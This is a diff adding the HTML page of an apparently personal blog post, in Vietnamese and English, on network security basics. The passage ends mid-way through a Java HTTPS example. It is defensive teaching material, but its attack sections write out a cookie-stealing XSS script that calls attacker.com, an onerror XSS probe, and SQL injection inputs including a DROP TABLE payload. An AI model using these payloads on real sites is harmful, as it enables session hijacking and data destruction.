@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/my-personal-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=my-personal-blog/livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Network Security Basics — Bảo vệ Mạng của Bạn - Blog Lập Trình Mạng</title><meta name="Description" content="Hugo theme - LoveIt"><meta property="og:url" content="http://localhost:1313/my-personal-blog/posts/2025-12-23-network-security/">
+  <meta property="og:site_name" content="Blog Lập Trình Mạng">
+  <meta property="og:title" content="Network Security Basics — Bảo vệ Mạng của Bạn">
+  <meta property="og:description" content="Các nguyên tắc bảo mật mạng cơ bản và cách bảo vệ ứng dụng từ các cuộc tấn công.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-23T11:00:00+07:00">
+    <meta property="article:modified_time" content="2025-12-23T11:00:00+07:00">
+    <meta property="article:tag" content="Security">
+    <meta property="article:tag" content="Network">
+    <meta property="article:tag" content="Protection">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Network Security Basics — Bảo vệ Mạng của Bạn">
+  <meta name="twitter:description" content="Các nguyên tắc bảo mật mạng cơ bản và cách bảo vệ ứng dụng từ các cuộc tấn công.">
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/my-personal-blog/posts/2025-12-23-network-security/" /><link rel="prev" href="http://localhost:1313/my-personal-blog/posts/2025-12-23-tcp-ip-stack/" /><link rel="next" href="http://localhost:1313/my-personal-blog/posts/2025-12-23-load-balancing/" /><link rel="stylesheet" href="/my-personal-blog/css/style.min.css"><link rel="preload" href="/my-personal-blog/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/my-personal-blog/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/my-personal-blog/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/my-personal-blog/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Network Security Basics — Bảo vệ Mạng của Bạn",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/my-personal-blog\/posts\/2025-12-23-network-security\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/my-personal-blog\/images\/Apple-Devices-Preview.png",
+                            "width":  3200 ,
+                            "height":  2048 
+                        }],"genre": "posts","keywords": "security, network, protection","wordcount":  1028 ,
+        "url": "http:\/\/localhost:1313\/my-personal-blog\/posts\/2025-12-23-network-security\/","datePublished": "2025-12-23T11:00:00+07:00","dateModified": "2025-12-23T11:00:00+07:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/localhost:1313\/my-personal-blog\/images\/avatar.png",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "xxxx"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/my-personal-blog/" title="Blog Lập Trình Mạng"><span class="header-title-pre"><i class='fas fa-bars fa-fw' aria-hidden='true'></i></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/my-personal-blog/posts/"> Posts </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search articles..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/my-personal-blog/" title="Blog Lập Trình Mạng"><span class="header-title-pre"><i class='fas fa-bars fa-fw' aria-hidden='true'></i></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search articles..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/my-personal-blog/posts/" title="">Posts</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Network Security Basics — Bảo vệ Mạng của Bạn</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/my-personal-blog/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>xxxx</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-23">2025-12-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1028 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#network-security-overview">Network Security Overview</a>
+      <ul>
+        <li><a href="#mục-tiêu-security-cia-triad">Mục tiêu Security (CIA Triad)</a></li>
+      </ul>
+    </li>
+    <li><a href="#common-network-attacks">Common Network Attacks</a>
+      <ul>
+        <li><a href="#1-denial-of-service-dos">1. Denial of Service (DoS)</a></li>
+        <li><a href="#2-distributed-denial-of-service-ddos">2. Distributed Denial of Service (DDoS)</a></li>
+        <li><a href="#3-man-in-the-middle-mitm-attack">3. Man-in-the-Middle (MITM) Attack</a></li>
+        <li><a href="#4-sql-injection">4. SQL Injection</a></li>
+        <li><a href="#5-cross-site-scripting-xss">5. Cross-Site Scripting (XSS)</a></li>
+      </ul>
+    </li>
+    <li><a href="#encryption">Encryption</a>
+      <ul>
+        <li><a href="#symmetric-encryption">Symmetric Encryption</a></li>
+        <li><a href="#asymmetric-encryption">Asymmetric Encryption</a></li>
+      </ul>
+    </li>
+    <li><a href="#tlsssl-encryption">TLS/SSL Encryption</a></li>
+    <li><a href="#firewall">Firewall</a></li>
+    <li><a href="#authentication">Authentication</a>
+      <ul>
+        <li><a href="#single-factor-weak">Single-Factor (Weak)</a></li>
+        <li><a href="#multi-factor-authentication-mfa">Multi-Factor Authentication (MFA)</a></li>
+      </ul>
+    </li>
+    <li><a href="#secure-coding">Secure Coding</a>
+      <ul>
+        <li><a href="#bad-">Bad ❌</a></li>
+        <li><a href="#good-">Good ✅</a></li>
+        <li><a href="#https-example">HTTPS Example</a></li>
+        <li><a href="#secure-headers">Secure Headers</a></li>
+      </ul>
+    </li>
+    <li><a href="#password-security">Password Security</a>
+      <ul>
+        <li><a href="#bad--1">Bad ❌</a></li>
+        <li><a href="#good--1">Good ✅</a></li>
+      </ul>
+    </li>
+    <li><a href="#network-monitoring">Network Monitoring</a></li>
+    <li><a href="#security-layers">Security Layers</a></li>
+    <li><a href="#best-practices">Best Practices</a></li>
+    <li><a href="#kết-luận">Kết luận</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="network-security-overview">Network Security Overview</h2>
+<p>Network security là việc bảo vệ mạng từ các truy cập trái phép, thay đổi dữ liệu, hoặc xóa dữ liệu.</p>
+<h3 id="mục-tiêu-security-cia-triad">Mục tiêu Security (CIA Triad)</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>      ┌──────────┐
+      │ Integrity│  ← Dữ liệu không được sửa đổi
+      └──────────┘
+          ▲
+         / \
+        /   \
+┌──────────┐ ┌──────────────┐
+│Confidence│ │Availability  │
+│(Privacy) │ │(No Downtime) │
+└──────────┘ └──────────────┘</code></pre></div>
+<ol>
+<li><strong>Confidentiality (Bảo mật)</strong>: Chỉ người được phép mới xem dữ liệu</li>
+<li><strong>Integrity (Toàn vẹn)</strong>: Dữ liệu không bị thay đổi trái phép</li>
+<li><strong>Availability (Khả dụng)</strong>: Dữ liệu luôn sẵn sàng khi cần</li>
+</ol>
+<h2 id="common-network-attacks">Common Network Attacks</h2>
+<h3 id="1-denial-of-service-dos">1. Denial of Service (DoS)</h3>
+<p>Làm quá tải server:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Attacker
+  |
+  | Flood packets to port 80
+  v
+Server → Overwhelmed → Can&#39;t serve users</code></pre></div>
+<p><strong>Ví dụ:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Attacker gửi 1,000,000 requests/second
+Server chỉ có thể xử lý 10,000 requests/second
+→ Legitimate users không thể truy cập</code></pre></div>
+<p><strong>Bảo vệ:</strong></p>
+<ul>
+<li>Rate limiting</li>
+<li>Traffic filtering</li>
+<li>CDN (CloudFlare, Akamai)</li>
+</ul>
+<h3 id="2-distributed-denial-of-service-ddos">2. Distributed Denial of Service (DDoS)</h3>
+<p>Tấn công từ nhiều machines:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>┌─────────────────────────────────────────────┐
+│         Attacker&#39;s Command Server           │
+└──────────┬──────────────────────────────────┘
+           │ Commands
+    ┌──────┼──────┬──────┐
+    │      │      │      │
+    v      v      v      v
+┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐
+│Bot 1│ │Bot 2│ │Bot 3│ │Bot N│  (Compromised devices)
+└──┬──┘ └──┬──┘ └──┬──┘ └──┬──┘
+   │       │       │       │
+   └───────┼───────┼───────┘
+           │       │ All flood
+           │       │ victim
+           v       v
+        ┌──────────────────┐
+        │ Victim Server    │
+        │ (Overwhelmed)    │
+        └──────────────────┘</code></pre></div>
+<h3 id="3-man-in-the-middle-mitm-attack">3. Man-in-the-Middle (MITM) Attack</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>User A ←→ Attacker ←→ User B (Attacker gửi/nhận)
+         (Listens and modifies)</code></pre></div>
+<p><strong>Ví dụ - Unencrypted Wifi:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Client: Send password: 12345 (plain text)
+Attacker on same WiFi: Captures password!</code></pre></div>
+<p><strong>Bảo vệ:</strong> HTTPS/TLS encryption</p>
+<h3 id="4-sql-injection">4. SQL Injection</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Normal query:
+SELECT * FROM users WHERE username = &#39;john&#39;
+
+Malicious input:
+username = &#39; OR &#39;1&#39;=&#39;1&#39;--
+Query becomes:
+SELECT * FROM users WHERE username = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;--
+Result: Returns ALL users!
+
+Worse - Delete all data:
+username = &#39; ; DROP TABLE users;--</code></pre></div>
+<p><strong>Bảo vệ:</strong></p>
+<ul>
+<li>Parameterized queries</li>
+<li>Input validation</li>
+<li>ORM (Object-Relational Mapping)</li>
+</ul>
+<h3 id="5-cross-site-scripting-xss">5. Cross-Site Scripting (XSS)</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Attacker injects JavaScript:
+&lt;script&gt;
+  fetch(&#39;https://attacker.com/steal?cookie=&#39; + document.cookie)
+&lt;/script&gt;
+
+When victim views page:
+→ Attacker gets victim&#39;s cookies
+→ Can hijack session</code></pre></div>
+<p><strong>Ví dụ:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>User comment: &lt;img src=x onerror=&#34;alert(&#39;XSS&#39;)&#34;&gt;
+When others view comment → Alert appears</code></pre></div>
+<p><strong>Bảo vệ:</strong></p>
+<ul>
+<li>HTML sanitization</li>
+<li>Content Security Policy (CSP)</li>
+<li>HttpOnly cookies</li>
+</ul>
+<h2 id="encryption">Encryption</h2>
+<h3 id="symmetric-encryption">Symmetric Encryption</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Original Data: &#34;Secret Message&#34;
+    ↓
+Encrypt with Key: &#34;password123&#34;
+    ↓
+Encrypted: &#34;K7#@!$Q%^&amp;&#34;
+    ↓
+Decrypt with same Key: &#34;password123&#34;
+    ↓
+Original Data: &#34;Secret Message&#34;</code></pre></div>
+<p><strong>Fast nhưng có vấn đề:</strong> Làm sao chia sẻ key an toàn?</p>
+<p><strong>Algorithms:</strong> AES, DES, Blowfish</p>
+<h3 id="asymmetric-encryption">Asymmetric Encryption</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Người A có: Public Key (công khai), Private Key (bí mật)
+
+Người B muốn gửi Secret cho Người A:
+Secret
+  ↓
+Encrypt with Public Key của A
+  ↓
+Encrypted Secret (bất kỳ ai cũng có thể gửi)
+  ↓
+Người A Decrypt với Private Key (chỉ A biết)
+  ↓
+Secret (an toàn!)</code></pre></div>
+<p><strong>Ưu điểm:</strong> Không cần chia sẻ key<br>
+<strong>Nhược điểm:</strong> Slow hơn symmetric</p>
+<p><strong>Algorithms:</strong> RSA, ECC</p>
+<h2 id="tlsssl-encryption">TLS/SSL Encryption</h2>
+<p>HTTPS sử dụng TLS (Transport Layer Security):</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>1. Client → Server: Hello (supported algorithms)
+
+2. Server → Client: Certificate + Public Key
+
+3. Client: 
+   - Verify certificate
+   - Generate random key
+   - Encrypt with Server&#39;s public key
+   → Send to server
+
+4. Server:
+   - Decrypt with private key
+   - Now both have shared key
+
+5. All data now encrypted with shared key</code></pre></div>
+<h2 id="firewall">Firewall</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>┌─────────────────────────────────────────────┐
+│            Internet                         │
+└─────────┬───────────────────────────────────┘
+          │
+          │ Firewall Rules:
+          │ - Allow: HTTP(80), HTTPS(443), SSH(22)
+          │ - Block: Everything else
+          ↓
+┌─────────────────────────────────────────────┐
+│            Internal Network                 │
+│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
+│  │Web Server│  │App Server│  │Database  │  │
+│  │Port 80   │  │Port 8080 │  │Port 3306 │  │
+│  └──────────┘  └──────────┘  └──────────┘  │
+└─────────────────────────────────────────────┘</code></pre></div>
+<h2 id="authentication">Authentication</h2>
+<h3 id="single-factor-weak">Single-Factor (Weak)</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Login
+  ↓
+Enter password
+  ↓
+If correct → Access</code></pre></div>
+<p><strong>Problem:</strong> Password bị crack</p>
+<h3 id="multi-factor-authentication-mfa">Multi-Factor Authentication (MFA)</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Login
+  ↓
+Enter password
+  ↓
+If correct → 
+  ↓
+Receive code on phone
+  ↓
+Enter code
+  ↓
+If correct → Access</code></pre></div>
+<p><strong>Factors:</strong></p>
+<ol>
+<li>Something you know (password)</li>
+<li>Something you have (phone, hardware token)</li>
+<li>Something you are (fingerprint, face)</li>
+</ol>
+<h2 id="secure-coding">Secure Coding</h2>
+<h3 id="bad-">Bad ❌</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-java">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;SELECT * FROM users WHERE id = &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">userId</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Statement</span><span class="w"> </span><span class="n">stmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">createStatement</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ResultSet</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stmt</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">(</span><span class="n">query</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="n">Vulnerable</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">injection</span><span class="o">!</span></span></span></code></pre></div></div>
+<h3 id="good-">Good ✅</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-java">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;SELECT * FROM users WHERE id = ?&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PreparedStatement</span><span class="w"> </span><span class="n">stmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">prepareStatement</span><span class="p">(</span><span class="n">query</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">stmt</span><span class="p">.</span><span class="na">setInt</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">userId</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ResultSet</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stmt</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="n">Protected</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">parameters</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">escaped</span></span></span></code></pre></div></div>
+<h3 id="https-example">HTTPS Example</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-java">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.ssl.HttpsURLConnection</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SecureConnection</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">URL</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="s">&#34;https://api.example.com/data&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpsURLConnection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpsURLConnection</span><span class="p">)</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="na">openConnection</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Verify certificate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">conn</span><span class="p">.</span><span class="na">setDefaultHostnameVerifier</span><span class="p">((</span><span class="n">hostname</span><span class="p">,</span><span class="w"> </span><span class="n">session</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// Check if certificate is valid for this hostname</span><span class="w">
